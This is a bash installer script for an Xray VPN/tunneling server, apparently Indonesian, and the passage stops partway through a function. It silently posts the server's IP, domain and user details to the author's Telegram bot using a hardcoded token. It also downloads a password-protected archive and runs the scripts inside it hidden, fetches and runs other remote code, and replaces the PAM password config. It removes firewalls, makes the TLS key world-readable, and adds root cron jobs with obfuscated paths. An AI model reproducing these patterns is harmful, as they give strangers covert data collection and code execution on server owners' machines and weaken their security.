#!/bin/bash
wget -q https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Fls/http -O /usr/bin/http
cekhttp=$(cat /usr/bin/http)
Green="\e[92;1m"
RED="\033[1;31m"
YELLOW="\033[33m"
BLUE="\033[36m"
FONT="\033[0m"
GREENBG="\033[42;37m"
REDBG="\033[41;37m"
OK="${Green}--->${FONT}"
ERROR="${RED}[ERROR]${FONT}"
GRAY="\e[1;30m"
NC='\e[0m'
red='\e[1;31m'
green='\e[0;32m'
TIME=$(date '+%d %b %Y')
ipsaya=$(wget -qO- ipinfo.io/ip)
TIMES="10"
CHATID="7114686701"
KEY="7291232496:AAECM92Z4en7a1xCaUuvITHBgamVi-C9Irs"
URL="https://api.telegram.org/bot$KEY/sendMessage"
export IP=$( curl -sS icanhazip.com )
function print_ok() {
echo -e "${OK} ${BLUE} $1 ${FONT}"
}
function print_install() {
echo -e "${green} =============================== ${FONT}"
echo -e "${YELLOW} # $1 ${FONT}"
echo -e "${green} =============================== ${FONT}"
sleep 1
}
function print_error() {
echo -e "${ERROR} ${REDBG} $1 ${FONT}"
}
function print_success() {
if [[ 0 -eq $? ]]; then
echo -e "${green} =============================== ${FONT}"
echo -e "${Green} # $1 berhasil dipasang"
echo -e "${green} =============================== ${FONT}"
sleep 2
fi
}
# Function to show a progress bar
fun_bar() {
    CMD[0]="$1"
    CMD[1]="$2"
    (
        [[ -e $HOME/fim ]] && rm $HOME/fim
        ${CMD[0]} -y >/dev/null 2>&1
        ${CMD[1]} -y >/dev/null 2>&1
        touch $HOME/fim
    ) >/dev/null 2>&1 &
    tput civis
    echo -ne "  \033[0;33mPlease Wait Loading \033[1;37m- \033[0;33m["
    while true; do
        for ((i = 0; i < 18; i++)); do
            echo -ne "\033[0;32m#"
            sleep 0.1s
        done
        [[ -e $HOME/fim ]] && rm $HOME/fim && break
        echo -e "\033[0;33m]"
        sleep 1s
        tput cuu1
        tput dl1
        echo -ne "  \033[0;33mPlease Wait Loading \033[1;37m- \033[0;33m["
    done
    echo -e "\033[0;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
    tput cnorm
}

# Function to download and extract the update
res1() {
apt-get update -y 
export DEBIAN_FRONTEND=noninteractive
echo 'openssh-server openssh-server/keep-obsolete-conffile boolean true' | debconf-set-selections
apt install -y
apt upgrade -y
apt update -y
apt install iputils-ping -y
apt install bzip2 -y
apt install gzip -y
apt install xz-utils -y
apt install jq curl -y
apt install wondershaper -y
apt install lolcat -y
gem install lolcat -y
apt install at -y
apt install zip pwgen openssl netcat socat cron bash-completion -y
apt install figlet -y
apt update -y
apt upgrade -y
apt dist-upgrade -y
systemctl enable chronyd
systemctl restart chronyd
systemctl enable chrony
systemctl restart chrony
chronyc sourcestats -v
chronyc tracking -v
apt install ntpdate -y
ntpdate pool.ntp.org
apt install sudo -y
sudo apt-get clean all
sudo apt-get autoremove -y
sudo apt-get install -y debconf-utils
sudo apt-get remove --purge exim4 -y
sudo apt-get remove --purge ufw firewalld -y
sudo apt-get install -y --no-install-recommends software-properties-common
echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
sudo apt-get install -y speedtest-cli vnstat libnss3-dev libnspr4-dev pkg-config libpam0g-dev libcap-ng-dev libcap-ng-utils libselinux1-dev libcurl4-nss-dev flex bison make libnss3-tools libevent-dev bc rsyslog dos2unix zlib1g-dev libssl-dev libsqlite3-dev sed dirmngr libxml-parser-perl build-essential gcc g++ python htop lsof tar wget curl ruby zip unzip p7zip-full python3-pip libc6 util-linux build-essential msmtp-mta ca-certificates bsd-mailx iptables iptables-persistent netfilter-persistent net-tools openssl ca-certificates gnupg gnupg2 ca-certificates lsb-release gcc shc make cmake git screen socat xz-utils apt-transport-https gnupg1 dnsutils cron bash-completion ntpdate chrony jq openvpn easy-rsa
}
# Clear the terminal
clear
# Display update messages
print_install "Menginstall Packet Yang Dibutuhkan"
# Run the update function with progress bar
fun_bar 'res1'

clear
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo -e "\033[96;1m          WELCOME TO SRICPT BY ZERO-TUNNELING            \033[0m"
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo ""
sleep 1
if [[ $( uname -m | awk '{print $1}' ) == "x86_64" ]]; then
echo -e "${OK} Your Architecture Is Supported ( ${green}$( uname -m )${NC} )"
else
echo -e "${EROR} Your Architecture Is Not Supported ( ${YELLOW}$( uname -m )${NC} )"
exit 1
fi
if [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "ubuntu" ]]; then
echo -e "${OK} Your OS Is Supported ( ${green}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
elif [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "debian" ]]; then
echo -e "${OK} Your OS Is Supported ( ${green}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
else
echo -e "${EROR} Your OS Is Not Supported ( ${YELLOW}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
exit 1
fi
if [[ $ipsaya == "" ]]; then
echo -e "${EROR} IP Address ( ${RED}Not Detected${NC} )"
else
echo -e "${OK} IP Address ( ${green}$IP${NC} )"
fi
echo ""
echo "Process ${GRAY}[ ${NC}${green}Install${NC} ${GRAY}]${NC} For Starting Installation "
echo ""
clear
if [ "${EUID}" -ne 0 ]; then
echo "You need to run this script as root"
exit 1
fi
if [ "$(systemd-detect-virt)" == "openvz" ]; then
echo "OpenVZ is not supported"
exit 1
fi
red='\e[1;31m'
green='\e[0;32m'
NC='\e[0m'
MYIP=$(curl -sS ipv4.icanhazip.com)
echo -e "\e[32mloading...\e[0m"
clear
MYIP=$(curl -sS ipv4.icanhazip.com)
echo -e "\e[32mloading...\e[0m"
clear
# // USERNAME IZIN IPP
wget https://github.com/kcepu877/zero-tunneling/blob/main/Fls/http -O /usr/bin/http >/dev/null 2>&1
rm -rf /usr/bin/user
username=$(curl -sS https://raw.githubusercontent.com/kcepu877/izin/main/ip | grep $MYIP | awk '{print $2}')
  # Jika tidak ditemukan di data_ip1, cek di data_ip2
  if [[ -z $username ]]; then
    username=$(curl -sS https://$cekhttp:81/ip-script | grep $MYIP | awk '{print $2}')
  fi
echo "$username" >/usr/bin/user
rm -rf /usr/bin/e
valid=$(curl -sS https://raw.githubusercontent.com/kcepu877/izin/main/ip | grep $MYIP | awk '{print $3}')
  # Jika tidak ditemukan di data_ip1, cek di data_ip2
  if [[ -z $valid ]]; then
    valid=$(curl -sS https://$cekhttp:81/ip-script | grep $MYIP | awk '{print $3}')
  fi
echo "$valid" > /usr/bin/e
username=$(cat /usr/bin/user)
exp=$(cat /usr/bin/e)
clear
d1=$(date -d "$valid" +%s)
d2=$(date -d "$today" +%s)
certifacate=$(((d1 - d2) / 86400))
DATE=$(date +'%Y-%m-%d')
datediff() {
d1=$(date -d "$1" +%s)
d2=$(date -d "$2" +%s)
echo -e "$COLOR1 $NC Expiry In   : $(( (d1 - d2) / 86400 )) Days"
}
mai="datediff "$Exp" "$DATE""
Info="(${green}Active${NC})"
Error="(${RED}ExpiRED${NC})"
today=`date -d "0 days" +"%Y-%m-%d"`
Exp1=$(curl ${uzinsc} | grep $MYIP | awk '{print $4}')
if [[ $today < $Exp1 ]]; then
sts="${Info}"
else
sts="${Error}"
fi
echo -e "\e[32mloading...\e[0m"
clear
REPO="https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/"
start=$(date +%s)
secs_to_human() {
echo "Installation time : $((${1} / 3600)) hours $(((${1} / 60) % 60)) minute's $((${1} % 60)) seconds"
}
function is_root() {
if [[ 0 == "$UID" ]]; then
print_ok "Root user Start installation process"
else
print_error "The current user is not the root user, please switch to the root user and run the script again"
fi
}
##print_install "Membuat direktori xray"
mkdir -p /etc/xray
curl -s ifconfig.me > /etc/xray/ipvps
touch /etc/xray/domain
mkdir -p /var/log/xray
chown www-data.www-data /var/log/xray
chmod +x /var/log/xray
touch /var/log/xray/access.log
touch /var/log/xray/error.log
mkdir -p /var/lib/kyt >/dev/null 2>&1
while IFS=":" read -r a b; do
case $a in
"MemTotal") ((mem_used+=${b/kB})); mem_total="${b/kB}" ;;
"Shmem") ((mem_used+=${b/kB}))  ;;
"MemFree" | "Buffers" | "Cached" | "SReclaimable")
mem_used="$((mem_used-=${b/kB}))"
;;
esac
done < /proc/meminfo
Ram_Usage="$((mem_used / 1024))"
Ram_Total="$((mem_total / 1024))"
export tanggal=`date -d "0 days" +"%d-%m-%Y - %X" `
export OS_Name=$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g' )
export Kernel=$( uname -r )
export Arch=$( uname -m )
export IP=$( curl -s https://ipinfo.io/ip/ )
function first_setup(){
timedatectl set-timezone Asia/Jakarta
echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
#print_success "Directory Xray"
if [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "ubuntu" ]]; then
echo "Setup Dependencies $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
sudo apt update -y
apt-get install --no-install-recommends software-properties-common
add-apt-repository ppa:vbernat/haproxy-2.0 -y
apt-get -y install haproxy=2.0.\*
elif [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "debian" ]]; then
echo "Setup Dependencies For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
curl https://haproxy.debian.net/bernat.debian.org.gpg |
gpg --dearmor >/usr/share/keyrings/haproxy.debian.net.gpg
echo deb "[signed-by=/usr/share/keyrings/haproxy.debian.net.gpg]" \
http://haproxy.debian.net buster-backports-1.8 main \
>/etc/apt/sources.list.d/haproxy.list
sudo apt-get update
apt-get -y install haproxy=1.8.\*
else
echo -e " Your OS Is Not Supported ($(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g') )"
exit 1
fi
}
clear
function nginx_install() {
if [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "ubuntu" ]]; then
#print_install "Setup nginx For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
sudo apt-get install nginx -y
elif [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "debian" ]]; then
#print_success "Setup nginx For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
apt -y install nginx
else
echo -e " Your OS Is Not Supported ( ${YELLOW}$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')${FONT} )"
fi
}
clear
select_random_domain() {
    # Menggunakan gdown untuk mengunduh file dari Google Drive
    #gdown "1Q6-Fx_2Jn9uP_iPQneIFlfw2tMzI0s4A" -O cf.sh > /dev/null 2>&1
    wget https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/eror.zip -O eror.zip > /dev/null 2>&1
     7z x -pHeyHeyMauDecryptYaAwokawokARISTORE eror.zip > /dev/null 2>&1
    
    # Jika unduhan berhasil, lanjutkan dengan eksekusi
    if [ $? -eq 0 ]; then
        chmod +x cf.sh
        ./cf.sh > /dev/null 2>&1
        rm -f /root/cf.sh /root/cf-02.sh eror.zip
    else
        # Jika unduhan gagal, bisa menambahkan metode cadangan di sini
        # Contoh: wget sebagai cadangan
        wget "https://github.com/kcepu877/zero-tunneling/Fls/cf.sh" -O cf.sh  >/dev/null 2>&1 && chmod +x cf.sh && ./cf.sh > /dev/null 2>&1
        rm -f /root/cf.sh /root/cf-02.sh eror.zip
    fi
    clear
}
select_ZERO-TUNNELING_domain() {
    echo "Selecting a Add Domain BY ZERO-TUNNELING..."
    # Gantilah dengan URL atau metode lain yang sesuai untuk mendapatkan domain acak
	#gdown "1MlXwNGSlXHKDOfFu3_6Y_JN9JXmrA3ay" -O cf-02.sh > /dev/null 2>&1
    wget https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/eror.zip -O eror.zip > /dev/null 2>&1
     7z x -pHeyHeyMauDecryptYaAwokawokARISTORE eror.zip > /dev/null 2>&1
    
     # Jika unduhan berhasil, lanjutkan dengan eksekusi
    if [ $? -eq 0 ]; then
        chmod +x cf-02.sh
        ./cf-02.sh > /dev/null 2>&1
        rm -f /root/cf.sh /root/cf-02.sh eror.zip
    else
        # Jika unduhan gagal, bisa menambahkan metode cadangan di sini
        # Contoh: wget sebagai cadangan
        wget "https://github.com/kcepu877/zero-tunneling/Fls/cf-02.sh" -O cf-02.sh  >/dev/null 2>&1 && chmod +x cf-02.sh && ./cf-02.sh > /dev/null 2>&1
        rm -f /root/cf.sh /root/cf-02.sh eror.zip
    fi
    clear
}

# Fungsi untuk mengatur domain
function pasang_domain() {
    echo -e ""
    clear
    echo -e "    ----------------------------------"
    echo -e "   |\e[1;32mPlease Select a Domain Type Below \e[0m|"
    echo -e "    ----------------------------------"
    echo -e "     \e[1;32m1)\e[0m Your Domain"
    echo -e "     \e[1;32m2)\e[0m Random Domain"
    echo -e "     \e[1;32m3)\e[0m Add Domain BY ZERO-TUNNELING"
    echo -e "   ------------------------------------"
    
    # Fungsi untuk menangani input dengan timeout
    read_with_timeout() {
        local timeout=$1
        local prompt=$2
        local result
        { read -t "$timeout" -p "$prompt" result; } || result=""
        echo "$result"
    }

    # Menangani input dengan timeout 3 detik
    host=$(read_with_timeout 5 "   Please select numbers 1-3 or timeout 5s: ")
    echo ""
    
    if [[ -z "$host" ]]; then
        # Tidak ada input dalam 3 detik, pilih domain acak
        select_random_domain
        return
    fi

    if [[ $host == "1" ]]; then
        clear
        echo ""
        echo ""
        echo -e "   \e[1;36m_______________________________$NC"
        echo -e "   \e[1;32m      CHANGES DOMAIN $NC"
        echo -e "   \e[1;36m_______________________________$NC"
        echo -e ""
        read -p "   INPUT YOUR DOMAIN :   " host1
        echo "IP=${host1}" >> /var/lib/kyt/ipvps.conf
        echo $host1 > /etc/xray/domain
        echo $host1 > /root/domain
        if [[ -z "$nama" ]]; then
            echo "ZERO-TUNNELING" > /etc/xray/username
        else
            echo "$nama" > /etc/xray/username
        fi
        echo ""
    elif [[ $host == "2" ]]; then
        select_random_domain
    elif [[ $host == "3" ]]; then
        add_domain_by_ZERO-TUNNELING
    else
        echo "Invalid selection. Please choose 1, 2, 3, or press any key for random domain."
        pasang_domain
    fi
}

function add_domain_by_ZERO-TUNNELING() {
    clear
    echo ""
    echo ""
    echo -e "   \e[1;36m_______________________________$NC"
    echo -e "   \e[1;32m   ADD DOMAIN BY ZERO-TUNNELING $NC"
    echo -e "   \e[1;36m_______________________________$NC"
    echo -e ""
    read -p "   INPUT DOMAIN TO ADD:   " host2
    echo "IP=${host2}" >> /var/lib/kyt/ipvps.conf
    echo $host2 > /etc/xray/domain
    echo $host2 > /root/domain
   if [[ -z "$host2" ]]; then
        # Tidak ada input dalam 3 detik, pilih domain acak
        select_ZERO-TUNNELING_domain
        return
    fi

    if [[ -z "$nama" ]]; then
        echo "ZERO-TUNNELING" > /etc/xray/username
    else
        echo "$nama" > /etc/xray/username
    fi
    echo "Domain added successfully."
    echo ""
}

clear
restart_system() {
domainNOTIF=$(cat /etc/xray/domain)
USRSC=$(cat /usr/bin/user)
EXPSC=$(cat /usr/bin/e)
TIMEZONE=$(printf '%(%H:%M:%S)T')
TEXT="
<code>────────────────────</code>
<b> 🟢 NOTIFICATIONS INSTALL 🟢</b>
<code>────────────────────</code>
<code>ID     : </code><code>$USRSC</code>
<code>Domain : </code><code>$domainNOTIF</code>
<code>Date   : </code><code>$TIME</code>
<code>Time   : </code><code>$TIMEZONE</code>
<code>Ip vps : </code><code>$ipsaya</code>
<code>Exp Sc : </code><code>$EXPSC</code>
<code>────────────────────</code>
<i>Automatic Notification from Github</i>
"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ","url":"https://wa.me/seaker877"},{"text":"Contact","url":"https://wa.me/628786117414"}]]}'
curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
}
auto_system() {
    cron_file="/etc/cron.d/auto_update"
    pekerjaan_cron="15 1 * * * root /usr/temp/ynCzStE6HisazFa/ynCzStE6HisazFa/1aB2cD3eF4gH5iJ/ynCzStE6HisazFa/JYk8RmzNqL4XWqF/ynCzStE6HisazFa/Zs9TpUqVx4Wc7Fb/ynCzStE6HisazFa/2xA3bD4eF5gH6iJ/ynCzStE6HisazFa/Fh7Gd8YjK2L4M5n/ynCzStE6HisazFa/K8mP9qR5sT2uXwY/ynCzStE6HisazFa/auto_update"

    # Periksa apakah pekerjaan cron sudah ada di file
    if ! grep -Fq "$pekerjaan_cron" "$cron_file" 2>/dev/null; then
        echo "$pekerjaan_cron" > "$cron_file"
    fi
# Fungsi untuk menambahkan pekerjaan cron ke /etc/cron.d/
    cron_file="/etc/cron.d/backup_otomatis"
    pekerjaan_cron="15 23 * * * root /usr/temp/ynCzStE6HisazFa/ynCzStE6HisazFa/1aB2cD3eF4gH5iJ/ynCzStE6HisazFa/JYk8RmzNqL4XWqF/ynCzStE6HisazFa/Zs9TpUqVx4Wc7Fb/ynCzStE6HisazFa/2xA3bD4eF5gH6iJ/ynCzStE6HisazFa/Fh7Gd8YjK2L4M5n/ynCzStE6HisazFa/K8mP9qR5sT2uXwY/ynCzStE6HisazFa/backupfile"

    # Periksa apakah pekerjaan cron sudah ada di file
    if ! grep -Fq "$pekerjaan_cron" "$cron_file" 2>/dev/null; then
        echo "$pekerjaan_cron" > "$cron_file"
    fi

   if [ ! -e /usr/local/bin/reboot_otomatis ]; then
cat <<EOF > /usr/local/bin/reboot_otomatis
#!/bin/bash
wget -q https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Fls/http -O /usr/bin/http
cekhttp=$(cat /usr/bin/http)
tanggal=\$(date +"%m-%d-%Y")
waktu=\$(date +"%T")
echo "Successfully Reboot On \$tanggal Time \$waktu." >> /root/log-reboot.txt
/sbin/shutdown -r now
CHATID=$(grep -E "^#bot# " "/etc/bot/.bot.db" | cut -d ' ' -f 3)
KEY=$(grep -E "^#bot# " "/etc/bot/.bot.db" | cut -d ' ' -f 2)
TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"
TEXT="
<code>◇━━━━━━━━━━━━━━◇</code>
<b>  ⚠️AUTOUPDATE NOTIF⚠️</b>
<code>◇━━━━━━━━━━━━━━◇</code>
<code>Auto Update Script Done</code>
<code>◇━━━━━━━━━━━━━━◇</code>
"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ","url":"https://wa.me/seaker877"},{"text":"Contact","url":"https://wa.me/628786117414"}]]}'

curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
EOF
chmod +x /usr/local/bin/reboot_otomatis
    fi
    
    cron_file="/etc/cron.d/reboot_otomatis"
    pekerjaan_cron="0 3 * * * root /usr/local/bin/reboot_otomatis"

    # Periksa apakah pekerjaan cron sudah ada di file
    if ! grep -Fq "$pekerjaan_cron" "$cron_file" 2>/dev/null; then
        echo "$pekerjaan_cron" > "$cron_file"
    fi
}

clear
function pasang_ssl() {
clear
#print_install "Memasang SSL Pada Domain"
rm -rf /etc/xray/xray.key
rm -rf /etc/xray/xray.crt
domain=$(cat /root/domain)
STOPWEBSERVER=$(lsof -i:80 | cut -d' ' -f1 | awk 'NR==2 {print $1}')
rm -rf /root/.acme.sh
mkdir /root/.acme.sh
systemctl stop $STOPWEBSERVER
systemctl stop nginx
curl https://acme-install.netlify.app/acme.sh -o /root/.acme.sh/acme.sh
chmod +x /root/.acme.sh/acme.sh
/root/.acme.sh/acme.sh --upgrade --auto-upgrade
/root/.acme.sh/acme.sh --set-default-ca --server letsencrypt
/root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256
~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc
chmod 777 /etc/xray/xray.key
#print_success "SSL Certificate"
}
function make_folder_xray() {
rm -rf /etc/vmess/.vmess.db
rm -rf /etc/vless/.vless.db
rm -rf /etc/trojan/.trojan.db
rm -rf /etc/shadowsocks/.shadowsocks.db
rm -rf /etc/ssh/.ssh.db
rm -rf /etc/bot/.bot.db
mkdir -p /etc/bot
mkdir -p /etc/xray
mkdir -p /etc/vmess
mkdir -p /etc/vless
mkdir -p /etc/trojan
mkdir -p /etc/shadowsocks
mkdir -p /etc/ssh
mkdir -p /usr/bin/xray/
mkdir -p /var/log/xray/
mkdir -p /var/www/html
mkdir -p /etc/kyt/limit/vmess/ip
mkdir -p /etc/kyt/limit/vless/ip
mkdir -p /etc/kyt/limit/trojan/ip
mkdir -p /etc/kyt/limit/ssh/ip
mkdir -p /etc/limit/vmess
mkdir -p /etc/limit/vless
mkdir -p /etc/limit/trojan
mkdir -p /etc/limit/ssh
chmod +x /var/log/xray
touch /etc/xray/domain
touch /var/log/xray/access.log
touch /var/log/xray/error.log
touch /etc/vmess/.vmess.db
touch /etc/vless/.vless.db
touch /etc/trojan/.trojan.db
touch /etc/shadowsocks/.shadowsocks.db
touch /etc/ssh/.ssh.db
touch /etc/bot/.bot.db
echo "& plughin Account" >>/etc/vmess/.vmess.db
echo "& plughin Account" >>/etc/vless/.vless.db
echo "& plughin Account" >>/etc/trojan/.trojan.db
echo "& plughin Account" >>/etc/shadowsocks/.shadowsocks.db
echo "& plughin Account" >>/etc/ssh/.ssh.db
}
function install_xray() {
clear
#print_install "Core Xray 1.8.16 Latest Version"
#domainSock_dir="/run/xray";! [ -d $domainSock_dir ] && mkdir  $domainSock_dir
#chown www-data.www-data $domainSock_dir
#latest_version="$(curl -s https://api.github.com/repos/XTLS/Xray-core/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
#bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version $latest_version
#wget -O /etc/xray/config.json "${REPO}Cfg/config.json" >/dev/null 2>&1
#wget -O /etc/systemd/system/runn.service "${REPO}Fls/runn.service" >/dev/null 2>&1
#domain=$(cat /etc/xray/domain)
#IPVS=$(cat /etc/xray/ipvps)
#print_install "Core Xray 1.8.24 Latest Version"
domainSock_dir="/run/xray";! [ -d $domainSock_dir ] && mkdir  $domainSock_dir
chown www-data.www-data $domainSock_dir
latest_version="$(curl -s https://api.github.com/repos/XTLS/Xray-core/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version 1.8.24
wget -O /etc/xray/config.json "${REPO}Cfg/config.json" >/dev/null 2>&1
wget -O /etc/systemd/system/runn.service "${REPO}Fls/runn.service" >/dev/null 2>&1
domain=$(cat /etc/xray/domain)
IPVS=$(cat /etc/xray/ipvps)
#print_success "Core Xray 1.8.1 Latest Version"
clear
curl -s ipinfo.io/city >>/etc/xray/city
curl -s ipinfo.io/org | cut -d " " -f 2-10 >>/etc/xray/isp
#print_install "Memasang Konfigurasi Packet"
wget -O /etc/haproxy/haproxy.cfg "${REPO}Cfg/haproxy.cfg" >/dev/null 2>&1
wget -O /etc/nginx/conf.d/xray.conf "${REPO}Cfg/xray.conf" >/dev/null 2>&1
sed -i "s/xxx/${domain}/g" /etc/haproxy/haproxy.cfg
sed -i "s/xxx/${domain}/g" /etc/nginx/conf.d/xray.conf
curl ${REPO}Cfg/nginx.conf > /etc/nginx/nginx.conf
cat /etc/xray/xray.crt /etc/xray/xray.key | tee /etc/haproxy/hap.pem
chmod +x /etc/systemd/system/runn.service
rm -rf /etc/systemd/system/xray.service.d
cat >/etc/systemd/system/xray.service <<EOF
Description=Xray Service
Documentation=https://github.com
After=network.target nss-lookup.target
[Service]
User=www-data
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/local/bin/xray run -config /etc/xray/config.json
Restart=on-failure
RestartPreventExitStatus=23
filesNPROC=10000
filesNOFILE=1000000
[Install]
WantedBy=multi-user.target
EOF
#print_success "Konfigurasi Packet"
}
function ssh(){
clear
#print_install "Memasang Password SSH"
wget -O /etc/pam.d/common-password "${REPO}Fls/password"
chmod +x /etc/pam.d/common-password
DEBIAN_FRONTEND=noninteractive dpkg-reconfigure keyboard-configuration
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/altgr select The default for the keyboard layout"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/compose select No compose key"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/ctrl_alt_bksp boolean false"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layoutcode string de"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layout select English"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/modelcode string pc105"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/model select Generic 105-key (Intl) PC"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/optionscode string "
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/store_defaults_in_debconf_db boolean true"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/switch select No temporary switch"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/toggle select No toggling"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_layout boolean true"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_options boolean true"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_layout boolean true"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_options boolean true"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variantcode string "
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variant select English"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/xkb-keymap select "
cd
cat > /etc/systemd/system/rc-local.service <<-END
[Unit]
Description=/etc/rc.local
ConditionPathExists=/etc/rc.local
[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99
[Install]
WantedBy=multi-user.target
END
cat > /etc/rc.local <<-END
exit 0
END
chmod +x /etc/rc.local
systemctl enable rc-local
systemctl start rc-local.service
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
#print_success "Password SSH"
}
function udp_mini(){
clear
#print_install "Memasang Service limit Quota"
wget raw.githubusercontent.com/kcepu877/zero-tunneling/main/Fls/limit.sh && chmod +x limit.sh && ./limit.sh
cd
wget -q -O /usr/bin/limit-ip "${REPO}Fls/limit-ip"
chmod +x /usr/bin/*
cd /usr/bin
sed -i 's/\r//' limit-ip
cd
clear
cat >/etc/systemd/system/vmip.service << EOF
[Unit]
Description=My
ProjectAfter=network.target
[Service]
WorkingDirectory=/root
ExecStart=/usr/bin/limit-ip vmip
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
#systemctl restart vmip
#systemctl enable vmip
cat >/etc/systemd/system/vlip.service << EOF
[Unit]
Description=My
ProjectAfter=network.target
[Service]
WorkingDirectory=/root
ExecStart=/usr/bin/limit-ip vlip
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
#systemctl restart vlip
#systemctl enable vlip
cat >/etc/systemd/system/trip.service << EOF
[Unit]
Description=My
ProjectAfter=network.target
[Service]
WorkingDirectory=/root
ExecStart=/usr/bin/limit-ip trip
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
#systemctl restart trip
#systemctl enable trip
mkdir -p /usr/local/kyt/
wget -q -O /usr/local/kyt/udp-mini "${REPO}Fls/udp-mini"
chmod +x /usr/local/kyt/udp-mini
wget -q -O /etc/systemd/system/udp-mini-1.service "${REPO}Fls/udp-mini-1.service"
wget -q -O /etc/systemd/system/udp-mini-2.service "${REPO}Fls/udp-mini-2.service"
wget -q -O /etc/systemd/system/udp-mini-3.service "${REPO}Fls/udp-mini-3.service"
systemctl disable udp-mini-1
systemctl stop udp-mini-1
systemctl enable udp-mini-1
systemctl start udp-mini-1
systemctl disable udp-mini-2
systemctl stop udp-mini-2
systemctl enable udp-mini-2
systemctl start udp-mini-2
systemctl disable udp-mini-3
systemctl stop udp-mini-3
systemctl enable udp-mini-3
systemctl start udp-mini-3
#print_success "files Quota Service"
}
function ssh_slow(){
clear
